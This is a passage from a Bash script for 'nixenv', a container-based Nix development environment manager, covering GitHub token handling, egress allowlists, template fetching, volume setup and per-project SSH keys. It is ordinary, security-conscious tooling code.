  env="$("$ENGINE" inspect -f '{{range .Config.Env}}{{println .}}{{end}}' "$cname" 2>/dev/null || true)"
  mounts="$("$ENGINE" inspect -f '{{range .Mounts}}{{.Destination}} {{end}}' "$cname" 2>/dev/null || true)"
  if [ "$restricted" = 1 ] && ! printf '%s\n' "$env" | grep -qx "NIXENV_EGRESS_PROXY=http://$EGRESS_NAME:$EGRESS_PORT"; then
    warn "'$name' still points at the OLD egress proxy (squid now runs in '$EGRESS_NAME') — it has no network"
    stale=1
  fi
  if [ "$restricted" = 1 ] && capture_ca_trusted "$name" && [ -s "$EGRESS_DATA_DIR/mitmproxy/mitmproxy-ca-cert.pem" ] \
     && ! printf '%s' "$mounts" | grep -q '/etc/nixenv-capture-ca.crt'; then
    warn "'$name' does not trust the capture CA yet — its HTTPS requests fail while capture is on"
    stale=1
  fi
  [ -n "$stale" ] || return 0
  echo "    apply it with: $0 stop $name && $0 run $name"
  return 1
}

# Start the shared proxy the first time a project runs (unless PROXY_AUTOSTART=0).
# No-op when it's already running; non-fatal so a proxy failure never breaks 'run'
# (the subshell contains any die from cmd_proxy).
ensure_proxy_running() {
  [ "$PROXY_AUTOSTART" = 1 ] || return 0
  container_running "$PROXY_NAME" && return 0
  log "Auto-starting shared proxy (PROXY_AUTOSTART=0 to disable)"
  # Auto-start must never block on a password prompt: default to NOT running
  # 'mkcert -install' here (explicit '$0 proxy up' installs it, with an
  # explanation). A user who exported PROXY_MKCERT_INSTALL keeps their choice.
  (
    PROXY_MKCERT_INSTALL="${PROXY_MKCERT_INSTALL:-0}"
    cmd_proxy up
  ) || warn "proxy auto-start failed — start it with '$0 proxy up' (needs caddy: '$0 build')"
}

# --privileged for the nix builder so source builds using bwrap/user namespaces
# (e.g. zmx) work inside the builder container. No-op when disabled.
builder_priv() {
  [ "$BUILDER_PRIVILEGED" = 1 ] && printf '%s' "--privileged"
}

# ── GitHub token (optional) ──────────────────────────────────────────────────
# Resolving `github:` flake inputs (nixpkgs) goes through api.github.com, which
# allows 60 anonymous requests per hour PER IP ADDRESS. Behind a shared IP — an
# office network, a VPN, CI — everyone shares those 60, and `build`/`update`
# fail with "API rate limit exceeded". A token lifts it to 5,000/hour.
# Source order: $GITHUB_TOKEN, then $GITHUB_TOKEN_FILE. It is given ONLY to
# builds of nixenv's own flake, never to a project's (untrusted) flake.
GITHUB_TOKEN_URL="https://github.com/settings/personal-access-tokens/new?name=nixenv&description=Read-only%20access%20to%20public%20repositories%2C%20so%20Nix%20can%20resolve%20nixpkgs%20without%20hitting%20GitHub%27s%20anonymous%20API%20rate%20limit.&expires_in=366"

github_token() {
  if [ -n "${GITHUB_TOKEN:-}" ]; then printf '%s' "$GITHUB_TOKEN"; return 0; fi
  [ -f "$GITHUB_TOKEN_FILE" ] && tr -d '[:space:]' < "$GITHUB_TOKEN_FILE"
  return 0
}

# A token goes into NIX_CONFIG, so only accept the characters GitHub uses —
# anything else (a stray newline, a pasted command) could inject nix settings.
valid_github_token() {
  case "$1" in
    ""|*[!A-Za-z0-9_]*) return 1;;
    ghp_*|github_pat_*|gho_*|ghu_*|ghs_*) return 0;;
  esac
  return 1
}

save_github_token() {
  mkdir -p "$(dirname "$GITHUB_TOKEN_FILE")"
  ( umask 077; printf '%s\n' "$1" > "$GITHUB_TOKEN_FILE" )
  chmod 600 "$GITHUB_TOKEN_FILE" 2>/dev/null || true
  rm -f "$GITHUB_TOKEN_SKIP"
  ok "GitHub token saved to $GITHUB_TOKEN_FILE (mode 600)"
}

github_rate_limit_note() {
  warn "Nix looks up nixpkgs through GitHub's API, which allows only 60 anonymous"
  warn "requests per hour per IP address. On a shared IP (office network, VPN, CI)"
  warn "everyone shares those 60, so 'build' and 'update' can fail with"
  warn "\"API rate limit exceeded\". A GitHub token raises the limit to 5,000/hour."
  echo "    Optional — create one (public repositories, read-only, nothing else):"
  echo "      $GITHUB_TOKEN_URL"
  echo "    It is stored in $GITHUB_TOKEN_FILE and only used for nixenv's own"
  echo "    toolchain, never for a project's flake."
}

# Ask ONCE, on the first build/update without a token. Enter skips and is
# remembered; `github-token` sets or changes it later. Never prompts without a TTY.
ensure_github_token() {
  [ -n "$(github_token)" ] && return 0
  [ -f "$GITHUB_TOKEN_SKIP" ] && return 0
  echo
  github_rate_limit_note
  if [ ! -t 0 ]; then
    echo "    (no terminal — continuing without a token; set GITHUB_TOKEN or run '$0 github-token')"
    echo
    return 0
  fi
  local tok=""
  printf '    Paste a token, or press Enter to continue without one: '
  read -rs tok || true
  echo
  tok="$(printf '%s' "$tok" | tr -d '[:space:]')"
  if [ -z "$tok" ]; then
    mkdir -p "$(dirname "$GITHUB_TOKEN_SKIP")"; : > "$GITHUB_TOKEN_SKIP"
    log "continuing without a token (won't ask again — add one any time: $0 github-token)"
  elif valid_github_token "$tok"; then
    save_github_token "$tok"
  else
    warn "that doesn't look like a GitHub token (expected ghp_… or github_pat_…) — not saved"
  fi
  echo
}

# github-token [--clear|--status] — set, replace, remove or inspect the token.
cmd_github_token() {
  case "${1:-}" in
    --clear|clear)
      rm -f "$GITHUB_TOKEN_FILE"; ok "removed $GITHUB_TOKEN_FILE" ;;
    --status|status)
      if [ -n "${GITHUB_TOKEN:-}" ]; then ok "using \$GITHUB_TOKEN from the environment"
      elif [ -s "$GITHUB_TOKEN_FILE" ]; then ok "token stored in $GITHUB_TOKEN_FILE"
      else warn "no GitHub token — builds use GitHub's anonymous limit (60 requests/hour per IP)"; fi ;;
    "")
      rm -f "$GITHUB_TOKEN_SKIP"
      github_rate_limit_note
      [ -t 0 ] || die "needs a terminal — or put the token in $GITHUB_TOKEN_FILE yourself"
      local tok=""
      printf '    Paste the token: '
      read -rs tok || true; echo
      tok="$(printf '%s' "$tok" | tr -d '[:space:]')"
      valid_github_token "$tok" || die "that doesn't look like a GitHub token (expected ghp_… or github_pat_…)"
      save_github_token "$tok" ;;
    *) die "usage: $0 github-token [--clear|--status]" ;;
  esac
}

# Run a builder command, echoing its output, and explain a GitHub rate limit or
# a rejected token if that's what made it fail. $1 = base|project.
run_builder() {
  local kind="$1" log rc=0; shift
  log="$(mktemp)"
  if "$@" 2>&1 | tee "$log"; then rc=0; else rc=$?; fi
  if [ "$rc" != 0 ]; then
    if grep -q 'rate limit exceeded' "$log" 2>/dev/null; then
      echo
      if [ "$kind" = project ]; then
        warn "GitHub's API rate limit was hit while resolving this PROJECT's flake inputs."
        warn "Project builds never get your token (a project's flake is untrusted), so:"
        echo "    wait for the limit to reset (up to an hour), or lock the inputs once in"
        echo "    the repo ('nix flake lock') so a build doesn't need to look them up."
      elif [ -n "$(github_token)" ]; then
        warn "GitHub's API rate limit was hit even with a token — wait a little and retry."
      else
        github_rate_limit_note
        echo "    Then:  $0 github-token   (or: GITHUB_TOKEN=\$(gh auth token) $0 …)"
      fi
    elif grep -qE 'Bad credentials|HTTP error 401' "$log" 2>/dev/null && [ -n "$(github_token)" ]; then
      echo
      warn "GitHub rejected the stored token — it has probably expired or been revoked."
      echo "    Replace it:  $0 github-token      Remove it:  $0 github-token --clear"
    fi
  fi
  rm -f "$log"
  return "$rc"
}

# NIX_CONFIG for builder containers. Carries the optional GitHub token (see
# github_token) so `github:` inputs don't hit the anonymous API limit.
nix_config() {
  printf 'experimental-features = nix-command flakes\nmax-jobs = auto'
  local tok; tok="$(github_token)"
  if [ -n "$tok" ] && valid_github_token "$tok"; then
    printf '\naccess-tokens = github.com=%s' "$tok"
  fi
}

# NIX_CONFIG for building a PROJECT's flake — untrusted input:
#   * no access token: a build script could read it from the environment;
#   * accept-flake-config = false: a flake's nixConfig could otherwise add its
#     own substituter AND trusted key, and have attacker-signed binaries land in
#     the SHARED store that every project uses;
#   * sandbox = true with fallback: builds are sandboxed wherever the builder can
#     create namespaces (e.g. BUILDER_PRIVILEGED=1); an unprivileged builder
#     container usually can't, and Nix then falls back to building unsandboxed.
#     The trust boundary is documented rather than assumed.
nix_config_project() {
  printf 'experimental-features = nix-command flakes\nmax-jobs = auto\n'
  printf 'accept-flake-config = false\nsandbox = true\nsandbox-fallback = true'
}

# ── Volume helpers ───────────────────────────────────────────────────────────
volume_exists()  { "$ENGINE" volume inspect "$NIX_VOLUME" >/dev/null 2>&1; }
ensure_volume()  {
  if volume_exists; then
    ok "Volume '$NIX_VOLUME' already exists"
  else
    log "Creating standalone volume '$NIX_VOLUME'"
    "$ENGINE" volume create "$NIX_VOLUME" >/dev/null
    ok "Volume created"
  fi
}

# The store volume IS the builder image's /nix (Docker seeds an empty volume
# from the image). A garbage collect can therefore delete the builder's OWN
# toolchain — sh, coreutils, even nix — leaving a volume nothing can build in
# ("exec: sh: executable file not found"). Restore it by mounting the volume
# somewhere OTHER than /nix, so the image's intact store is visible to copy from.
# Existing files are never clobbered (-n), so our packages and DB survive.
ensure_builder_usable() {
  volume_exists || return 0
  "$ENGINE" run --rm -v "$NIX_VOLUME":/nix "$(img "$BUILDER_IMAGE")" \
    nix --version >/dev/null 2>&1 && return 0

  warn "the store volume has no working nix (a previous 'gc' collected the builder's tools)"
  log "restoring the builder toolchain from $BUILDER_IMAGE — no downloads"
  "$ENGINE" run --rm -v "$NIX_VOLUME":/mnt "$(img "$BUILDER_IMAGE")" \
    sh -c 'cp -an /nix/store/. /mnt/store/ 2>/dev/null; cp -an /nix/var/. /mnt/var/ 2>/dev/null; true' \
    >/dev/null 2>&1 || true

  if "$ENGINE" run --rm -v "$NIX_VOLUME":/nix "$(img "$BUILDER_IMAGE")" \
       nix --version >/dev/null 2>&1; then
    ok "builder toolchain restored"
  else
    die "could not repair the store volume — run '$0 clean' then '$0 build' (re-downloads everything)"
  fi
}

# Register the builder's own toolchain as GC roots so a collect can never
# remove the tools the next build needs. Idempotent; safe to call before any gc.
protect_builder_toolchain() {
  "$ENGINE" run --rm -v "$NIX_VOLUME":/nix \
    -e NIX_CONFIG="$(nix_config)" "$(img "$BUILDER_IMAGE")" \
    sh -euc '
      mkdir -p /nix/var/nix/gcroots
      for b in nix sh bash cp du tail env; do
        p="$(command -v "$b" 2>/dev/null)" || continue
        [ -n "$p" ] || continue
        nix-store --add-root "/nix/var/nix/gcroots/nixenv-builder-$b" \
          --indirect -r "$(readlink -f "$p")" >/dev/null 2>&1 || true
      done
    ' >/dev/null 2>&1 || warn "could not pin the builder toolchain as a GC root"
}

# Human-readable size of the store volume. Uses the RUNTIME image on purpose:
# the builder's coreutils live inside the store itself, so after a GC its `du`
# may be gone. debian:stable-slim ships its own /bin.
store_size() {
  "$ENGINE" run --rm -v "$NIX_VOLUME":/nix "$(img "$RUNTIME_IMAGE")" \
    du -sh /nix 2>/dev/null | cut -f1 || echo '?'
}

# True once the shared profile has been populated inside the volume.
store_is_populated() {
  "$ENGINE" run --rm -v "$NIX_VOLUME":/nix "$(img "$BUILDER_IMAGE")" \
    sh -c "[ -e '$PROFILE/bin' ]" >/dev/null 2>&1
}

# ── Project helpers ──────────────────────────────────────────────────────────
# Validate a project name once, at creation: it becomes a container name, volume
# names, a hostname, and a proxy subdomain, so keep it to a safe charset. Also
# reserve 'proxy' and 'egress' (their container names are the shared ones).
valid_project_name() {
  case "$1" in
    proxy) warn "'proxy' is reserved (container name '$PROXY_NAME' is the shared proxy)"; return 1;;
    egress) warn "'egress' is reserved (container name '$EGRESS_NAME' is the shared egress proxy)"; return 1;;
    ""|*[!a-zA-Z0-9_-]*) warn "project names may only contain letters, digits, '-' and '_'"; return 1;;
    -*) warn "project names may not start with '-'"; return 1;;
  esac
  return 0
}
project_dir()     { printf '%s/%s' "$PROJECTS_DIR" "$1"; }
app_volume()      { printf '%s_%s_app'  "$CONTAINER_PREFIX" "$1"; }   # e.g. nixenv_myapp_app       → /app
home_volume()     { printf '%s_%s_home' "$CONTAINER_PREFIX" "$1"; }   # e.g. nixenv_myapp_home      → /home/app
db_volume()       { printf '%s_%s_databases' "$CONTAINER_PREFIX" "$1"; } # e.g. nixenv_myapp_databases → /databases
project_profile() { printf '/nix/var/nix/profiles/proj-%s' "$1"; }   # per-project extra tooling
# Where the app (code) volume is mounted INSIDE the container. Chosen at init
# time, stored in <project>/app_mount; defaults to /app. Only the runtime
# container and its entrypoint care about this path — the seed/clone/build/sync
# helpers just read/write the volume via a throwaway mount, so the repo lands at
# the volume root regardless and appears at this path when the runtime mounts it.
# Validate a code-volume mount path: absolute, plain characters (it lands in a
# `-v vol:<path>` argument, where a ':' would smuggle in mount options), and not
# colliding with a reserved mount. Shared by `init --app-path` and `import`.
valid_app_mount() {
  case "$1" in
    /*) ;;
    *) warn "the app path must be absolute (got '$1')"; return 1;;
  esac
  case "$1" in
    *[!a-zA-Z0-9._/-]*|*/../*|*/..|*//*) warn "the app path may only contain letters, digits, '._-/' (got '$1')"; return 1;;
  esac
  case "$1" in
    /|/home|/home/*|/databases|/databases/*|/nix|/nix/*|/etc|/etc/*|/tmp|/tmp/*|/proc|/proc/*|/sys|/sys/*|/dev|/dev/*|/root|/root/*|/usr|/usr/*|/bin|/bin/*|/sbin|/sbin/*|/lib|/lib/*|/lib64|/lib64/*|/run|/run/*)
      warn "the app path '$1' collides with a reserved or system path — pick another"; return 1;;
  esac
  return 0
}
project_app_mount() {
  local f; f="$(project_dir "$1")/app_mount"
  if [ -f "$f" ] && [ -s "$f" ]; then cat "$f"; else printf '/app'; fi
}
vol_exists()      { "$ENGINE" volume inspect "$1" >/dev/null 2>&1; }

# ── Egress restriction (ON by default; opt-out per project) ──────────────────
# A restricted project runs on its own --internal network (kernel-enforced: no
# route to the internet), and reaches the outside ONLY through a single shared
# squid (domain allowlist, default-deny, per-project ACLs by source subnet)
# running inside the shared proxy container on port $EGRESS_PORT. Files in
# <project>/:
#   unrestricted   → opt-OUT marker: restriction disabled ('restrict <p> off')
#   allowed_hosts  → validated domains, one per line ('allow' appends; init
#                    seeds the forge domain from the clone URL)
is_restricted()        { [ ! -f "$(project_dir "$1")/unrestricted" ]; }

# Extra engine parameters for a project's container, from the per-project file
#   ~/.nixenv/projects/<project>/extra-parameters
# Deliberately a FILE, not a CLI flag, so it stays project state alongside
# 'unrestricted'/'ports'/'hosts.extra'. Contents are whitespace-separated tokens
# appended VERBATIM to the container's `run` ('#' comments stripped) — a general
# escape hatch for memory limits, devices, ulimits, security-opts, whatever.
#
# Flags are fixed at container CREATION, so edits need a `run <project>`.
project_extra_args() {
  local f; f="$(project_dir "$1")/extra-parameters"
  [ -f "$f" ] || return 0
  sed 's/#.*//' "$f" | tr '\n\t' '  ' | tr -s ' ' | sed 's/^ *//; s/ *$//'
}

# Defence-in-depth flags for every container nixenv runs long-lived.
# The containers already run as your uid with no usable root, so none of this
# costs a feature:
#   --cap-drop=ALL                 nothing we run needs a capability (low ports
#                                  and ping come from the sysctls instead);
#   no-new-privileges              setuid binaries in debian-slim (mount, passwd,
#                                  chsh…) can't be used to become root;
#   --pids-limit                   a fork bomb in one project can't take down the
#                                  engine VM, and with it every other project.
# NIXENV_PIDS_LIMIT=0 drops the pids limit (e.g. rootless podman without cgroup
# delegation, which rejects it). Memory is NOT limited by default — databases and
# builds vary too much; add --memory via extra-parameters.
container_hardening_args() {
  printf '%s\n' --cap-drop=ALL --security-opt=no-new-privileges
  if [ "${NIXENV_PIDS_LIMIT:-4096}" != 0 ]; then
    printf '%s\n' "--pids-limit=${NIXENV_PIDS_LIMIT:-4096}"
  fi
}

# Created empty (comments only) when missing, so the file is discoverable
# instead of something you have to know about. Never overwrites an existing one.
write_extra_parameters() {
  local f; f="$(project_dir "$1")/extra-parameters"
  [ -f "$f" ] && return 0
  cat > "$f" <<'EOF'
# nixenv: extra parameters for this project's container (auto-created, empty).
# Whitespace-separated flags, appended verbatim to the engine's `run`.
# Applied at container creation — re-run `nixenv run <project>` after editing.
#
# Example — run podman/docker INSIDE the container:
#   --security-opt seccomp=unconfined
#   --security-opt apparmor=unconfined
#   --security-opt label=disable
#   --device /dev/fuse
#   --device /dev/net/tun
# Note: containers start with --cap-drop=ALL, no-new-privileges and a pids limit.
# Flags here come later and win — e.g. --cap-add=SYS_ADMIN or
# --security-opt=no-new-privileges=false — but each one loosens the sandbox.
EOF
}
internal_net()         { printf '%s_%s_egress' "$CONTAINER_PREFIX" "$1"; }
ensure_internal_net()  {
  "$ENGINE" network inspect "$(internal_net "$1")" >/dev/null 2>&1 || \
    "$ENGINE" network create --internal "$(internal_net "$1")" >/dev/null
}
# 'deploy': the throwaway container and its OWN --internal network. '__' (like
# the dev sidecars) so no project's '<prefix>-<name>' can collide, and 'stop'
# with no project sweeps it. Squid gives that network the project's
# allowed_hosts PLUS <project>/deploy_hosts: production goes in the second
# file only, so the dev container still can't reach it.
deploy_container_name() { printf '%s__%s-deploy' "$CONTAINER_PREFIX" "$1"; }
deploy_net()            { printf '%s__%s-deploy' "$CONTAINER_PREFIX" "$1"; }
ensure_deploy_net()     {
  "$ENGINE" network inspect "$(deploy_net "$1")" >/dev/null 2>&1 || \
    "$ENGINE" network create --internal "$(deploy_net "$1")" >/dev/null
}
# Hosts in <project>/deploy_hosts, normalised, one per line (empty if none).
deploy_hosts() {
  local f d; f="$(project_dir "$1")/deploy_hosts"
  [ -f "$f" ] && [ ! -L "$f" ] || return 0
  while IFS= read -r d || [ -n "$d" ]; do
    d="$(printf '%s' "${d%%#*}" | tr -d '[:space:]')"
    [ -n "$d" ] || continue
    if d="$(normalize_allowed_host "$d")"; then printf '%s\n' "$d"; fi
  done < "$f"
}
# What the deploy container may reach: allowed_hosts + deploy_hosts, deduplicated.
deploy_allowlist() {
  local f d; f="$(project_dir "$1")/allowed_hosts"
  {
    if [ -f "$f" ] && [ ! -L "$f" ]; then
      while IFS= read -r d || [ -n "$d" ]; do
        d="$(printf '%s' "${d%%#*}" | tr -d '[:space:]')"
        [ -n "$d" ] || continue
        if d="$(normalize_allowed_host "$d")"; then printf '%s\n' "$d"; fi
      done < "$f"
    fi
    deploy_hosts "$1"
  } | awk '!seen[$0]++'
}

# Subnet of a network (for squid's per-project source ACLs). Docker exposes it
# under .IPAM.Config, podman (netavark) under .Subnets — try both.
net_subnet() {
  local s
  s="$("$ENGINE" network inspect "$1" --format '{{range .IPAM.Config}}{{.Subnet}} {{end}}' 2>/dev/null | awk '{print $1}')"
  [ -n "$s" ] || s="$("$ENGINE" network inspect "$1" --format '{{range .Subnets}}{{.Subnet}} {{end}}' 2>/dev/null | awk '{print $1}')"
  printf '%s' "$s"
}

# ── Templates ────────────────────────────────────────────────────────────────
# A template is ONE file which becomes the project's flake.nix. It may carry
# metadata in leading comments, which nixenv reads BEFORE building:
#   # nixenv:description  WordPress + PHP + MariaDB
#   # nixenv:allow        wordpress.org api.wordpress.org
#   # nixenv:port         8080
#   # nixenv:app-path     /var/www/html
# Everything else (packages, services, first-run setup) is plain Nix + the
# startup hook, so templates need no support code here.

# Resolve a template ref to a local file, fetching + caching if remote.
# Prints the path; returns 1 on failure.
resolve_template() {
  local ref="$1" url="" dest=""
  # An existing file always wins — absolute, ./relative or bare relative
  # (templates/foo.nix). Checked BEFORE the short-name branch so a path that
  # exists is never mistaken for a name.
  if [ -f "$ref" ]; then printf '%s' "$ref"; return 0; fi
  case "$ref" in
    https://*|file://*) url="$ref" ;;
    http://*)
      # A template is code (its flake is built, its hook runs): anyone on the
      # path could swap it over plain HTTP.
      if [ "${NIXENV_ALLOW_INSECURE_TEMPLATES:-0}" = 1 ]; then url="$ref"
      else warn "refusing a template over plain http:// — use https:// (or NIXENV_ALLOW_INSECURE_TEMPLATES=1)"; return 1
      fi ;;
    *://*) warn "unsupported template URL scheme: $ref"; return 1 ;;
    /*|./*|../*|*/*)                                # looks like a path, but isn't
      warn "no such template file: $ref"; return 1 ;;
    *.nix)                                          # a filename that doesn't exist
      warn "no such template file: $ref (short names have no .nix suffix)"; return 1 ;;
    *)
      case "$ref" in *[!a-zA-Z0-9._-]*) warn "invalid template name: $ref"; return 1;; esac
      url="$TEMPLATE_BASE/${ref}.nix"
      case "$url" in
        http://*)
          if [ "${NIXENV_ALLOW_INSECURE_TEMPLATES:-0}" != 1 ]; then
            warn "TEMPLATE_BASE is plain http:// — refusing (use https://, or NIXENV_ALLOW_INSECURE_TEMPLATES=1)"; return 1
          fi ;;
      esac ;;
  esac

  # file:// (a clone's or Homebrew's own templates): read directly, no curl —
  # a local path may contain spaces, which curl rejects in a URL.
  case "$url" in
    file://*)
      dest="${url#file://}"
      [ -f "$dest" ] || { warn "no such template: $dest"; return 1; }
      log "Using template: $dest" >&2
      printf '%s' "$dest"; return 0 ;;
  esac

  mkdir -p "$TEMPLATE_CACHE"
  dest="$TEMPLATE_CACHE/$(printf '%s' "$url" | tr -c 'a-zA-Z0-9._-' '_')"
  have curl || { warn "curl is required to fetch templates"; return 1; }
  log "Fetching template: $url" >&2
  curl -fsSL --max-time 30 -o "$dest.tmp" "$url" || { warn "could not fetch $url"; return 1; }
  [ -s "$dest.tmp" ] || { warn "template is empty: $url"; rm -f "$dest.tmp"; return 1; }
  mv "$dest.tmp" "$dest"
  # Show exactly what was fetched, so it can be compared/pinned.
  local sum=""
  if have sha256sum; then sum="$(sha256sum "$dest" | cut -d' ' -f1)"
  elif have shasum; then sum="$(shasum -a 256 "$dest" | cut -d' ' -f1)"; fi
  [ -z "$sum" ] || log "template sha256: $sum" >&2
  printf '%s' "$dest"
}

# Read one metadata key from a template file: template_meta <file> <key>
template_meta() {
  sed -n "s/^[[:space:]]*#[[:space:]]*nixenv:$2[[:space:]]\{1,\}//p" "$1" | head -1
}

# Extract the forge hostname from a git clone URL (https/ssh/scp-like forms).
forge_host_from_url() {
  local url="$1" host=""
  case "$url" in
    http://*|https://*|ssh://*|git://*)
      host="${url#*://}"; host="${host%%/*}"; host="${host##*@}"; host="${host%%:*}";;
    *@*:*)   # scp-like: git@host:path
      host="${url#*@}"; host="${host%%:*}";;
  esac
  printf '%s' "$host"
}

# Normalise + validate one allowlist entry. '*.foo' → '.foo' (squid's
# subdomain form); a bare name stays EXACT. Rejects schemes, ports and paths.
# Prints the normalised value; returns 1 if invalid.
normalize_allowed_host() {
  local d; d="$(printf '%s' "$1" | tr -d '[:space:]')"
  [ -n "$d" ] || return 1
  case "$d" in \*.*) d=".${d#\*.}";; esac
  case "$d" in *[!a-zA-Z0-9.-]*) return 1;; esac
  printf '%s' "$d"
}

# Append a domain to <project>/allowed_hosts (deduplicated).
add_allowed_host() {
  local pdir domain="$2" f; pdir="$(project_dir "$1")"; f="$pdir/allowed_hosts"
  [ -n "$domain" ] || return 0
  mkdir -p "$pdir"; touch "$f"
  grep -qxF "$domain" "$f" 2>/dev/null || { printf '%s\n' "$domain" >> "$f"; ok "allowed host: $domain"; }
}

# Ensure the project's /app and /home volumes exist and are OWNED BY OUR UID, so
# the non-root runtime container can write them. Named volumes start root-owned;
# we create them and chown via a one-time throwaway root helper container (only
# the running container is non-root). A freshly-created home volume is seeded
# from the host seed dir (<project>/home: skeleton + git identity/credentials).
ensure_volumes() {
  local name="$1" uid gid pdir appv homev dbv
  uid="$(id -u)"; gid="$(id -g)"; pdir="$(project_dir "$name")"
  appv="$(app_volume "$name")"; homev="$(home_volume "$name")"; dbv="$(db_volume "$name")"

  # Create any missing volume (existing ones are left as-is, with their data).
  vol_exists "$appv"  || "$ENGINE" volume create "$appv"  >/dev/null
  vol_exists "$homev" || "$ENGINE" volume create "$homev" >/dev/null
  vol_exists "$dbv"   || "$ENGINE" volume create "$dbv"   >/dev/null

  # Array (not a word-split string) so a $HOME with spaces survives quoting.
  local seedmount; seedmount=()
  [ -d "$pdir/home" ] && seedmount=(-v "$pdir/home:/seed:ro")

  # One ROOT helper: (1) seed the home volume ONLY if it's empty (never clobbers
  # existing data); (2) fix ownership of any volume whose root isn't our uid —
  # this self-heals volumes left root-owned by an interrupted run. The `chown -R`
  # fires ONLY when the owner is wrong, so a populated, correctly-owned volume
  # (e.g. /databases) is read but never modified.
  "$ENGINE" rm -f "${CONTAINER_PREFIX}__initvol-$name" >/dev/null 2>&1 || true
  "$ENGINE" run --rm --name "${CONTAINER_PREFIX}__initvol-$name" -u 0 \
    -v "$appv":/app -v "$homev":/home -v "$dbv":/databases \
    ${seedmount[@]+"${seedmount[@]}"} \
    -e NIXUID="$uid" -e NIXGID="$gid" \
    "$(img "$RUNTIME_IMAGE")" sh -c '
      if [ -d /seed ] && [ -z "$(ls -A /home 2>/dev/null)" ]; then
        cp -a /seed/. /home/ 2>/dev/null || cp -R /seed/. /home/ 2>/dev/null || true
      fi
      # Docker Desktop resets an EMPTY named volume back to root on the next
      # mount, wiping our chown. Drop a .keep so the volume is non-empty and its
      # ownership sticks. (clone_repo removes /app/.keep before cloning.)
      [ -z "$(ls -A /app 2>/dev/null)" ]       && : > /app/.keep       2>/dev/null || true
      [ -z "$(ls -A /databases 2>/dev/null)" ] && : > /databases/.keep 2>/dev/null || true
      for d in /app /home /databases; do
        cur=$(stat -c %u "$d" 2>/dev/null || echo -1)
        [ "$cur" = "$NIXUID" ] || chown -R "$NIXUID:$NIXGID" "$d"
      done
    ' >/dev/null 2>&1 || warn "volume init/ownership helper failed for '$name'"
}

# Generate the /etc/passwd, /etc/group, /etc/shadow that the container runs with.
# The container runs as the host uid/gid; these files give that id the name
# 'app' (home /home/app, shell = shared zsh). Both accounts have NO usable
# password ('*'): login is by the per-project ssh key only. OpenSSH
# treats '*' as "no password", not "locked" (locked is a '!' prefix), so pubkey
# auth still works. They are bind-mounted read-only into the container.
write_passwd_files() {
  local pdir="$1" uid gid sh="$PROFILE/bin/zsh"
  uid="$(id -u)"; gid="$(id -g)"
  cat > "$pdir/passwd" <<EOF
root:x:0:0:root:/root:/bin/sh
$APP_USER:x:$uid:$gid:$APP_USER:/home/$APP_USER:$sh
EOF
  cat > "$pdir/group" <<EOF
root:x:0:
$APP_USER:x:$gid:
EOF
  cat > "$pdir/shadow" <<EOF
root:*:19000:0:99999:7:::
$APP_USER:*:19000:0:99999:7:::
EOF
  chmod 644 "$pdir/passwd" "$pdir/group" "$pdir/shadow"
}
container_name() { printf '%s-%s' "$CONTAINER_PREFIX" "$1"; }
container_exists()  { "$ENGINE" ps -a --format '{{.Names}}' | grep -qx "$1"; }
container_running() { "$ENGINE" ps    --format '{{.Names}}' | grep -qx "$1"; }

# Write a host-side ssh client config at <project>/ssh/config (once — never
# clobbers your edits), so `ssh <project>` connects to the container. Your
# ~/.ssh/config picks it up via `Include ~/.nixenv/projects/*/ssh/config`
# (run: nixenv ssh-config --install).
# Per-project ssh key: the ONLY credential the container's sshd accepts.
# Generated on the HOST and kept in <project>/ssh/, which never travels in an
# export — so another project, or someone handed an archive, has no copy.
#
# <project>/ssh/authorized_keys is what gets bind-mounted read-only into the
# container: the project key, plus any lines YOU put in
# <project>/ssh/authorized_keys.extra (e.g. your own key for VS Code). Rewritten
# IN PLACE on every run, so the running container's bind mount sees updates.
# Generate an ed25519 keypair on the HOST (host ssh-keygen, else the store's).
gen_ed25519() {
  local key="$1" comment="$2" dir; dir="$(dirname "$key")"
  if have ssh-keygen; then
    ssh-keygen -q -t ed25519 -N '' -C "$comment" -f "$key" </dev/null \
      || die "could not generate $key"
  else
    # No host ssh-keygen: use the store's (openssh is in the base flake).
    "$ENGINE" run --rm --user "$(id -u):$(id -g)" $(engine_userns) \
      -v "$NIX_VOLUME":/nix:ro -v "$dir":/out "$(img "$RUNTIME_IMAGE")" \
      "$PROFILE/bin/ssh-keygen" -q -t ed25519 -N '' -C "$comment" -f "/out/$(basename "$key")" \
      || die "could not generate $key (and no ssh-keygen on the host)"
  fi
  chmod 600 "$key"
}

ensure_project_ssh_key() {
  local pdir="$1" sd key hkey name
  sd="$pdir/ssh"; key="$sd/id_ed25519"; hkey="$sd/host_ed25519_key"; name="$(basename "$pdir")"
  mkdir -p "$sd"; chmod 700 "$sd"
  if [ ! -f "$key" ]; then
    gen_ed25519 "$key" "nixenv-$name"
    ok "generated the project ssh key: $key"
  fi
  # The container's HOST key is generated here too and mounted
  # read-only, so its fingerprint is known BEFORE the first connection. `ssh
  # <project>` then checks it strictly — a process squatting the project's port
  # after the container stops can't impersonate it.
  if [ ! -f "$hkey" ]; then
    gen_ed25519 "$hkey" "nixenv-$name-host"
  fi
  printf '%s %s\n' "$(ssh_host_alias "$name")" "$(cut -d' ' -f1,2 "$hkey.pub")" > "$sd/known_hosts"
  chmod 644 "$sd/known_hosts"
  # (if/fi, not `[ -f ] && …`: inside a { } group a false test would make the
  # whole group fail and skip writing the file.)
  {
    cat "$key.pub"
    if [ -f "$sd/authorized_keys.extra" ]; then
      grep -v '^[[:space:]]*#' "$sd/authorized_keys.extra" | grep -v '^[[:space:]]*$' || true
    fi
  } > "$sd/authorized_keys"
  chmod 644 "$sd/authorized_keys"
}

# The name a project's host key is recorded under — independent of the port.
ssh_host_alias() { printf 'nixenv-%s' "$1"; }

write_host_ssh_config() {
  local name="$1" port pdir sd
  port="$(project_port "$name")"
  pdir="$(project_dir "$name")"; sd="$pdir/ssh"
  mkdir -p "$sd"
  if [ -f "$sd/config" ]; then
    # Written before key auth: add the IdentityFile lines after 'User',
    # leaving any hand edits alone. Without them `ssh <project>` would offer the
    # wrong keys and be refused.
    if ! grep -q 'IdentityFile' "$sd/config"; then
      awk -v k="$sd/id_ed25519" '
        { print }
        /^[[:space:]]*User[[:space:]]/ && !done {
          print "    IdentityFile \"" k "\""; print "    IdentitiesOnly yes"; done=1 }
      ' "$sd/config" > "$sd/config.tmp" && mv "$sd/config.tmp" "$sd/config"
      ok "added the project key to $sd/config"
    fi
    # Written before host-key pinning: swap the two generated
    # "trust anything" lines for the pinned ones; other hand edits are kept.
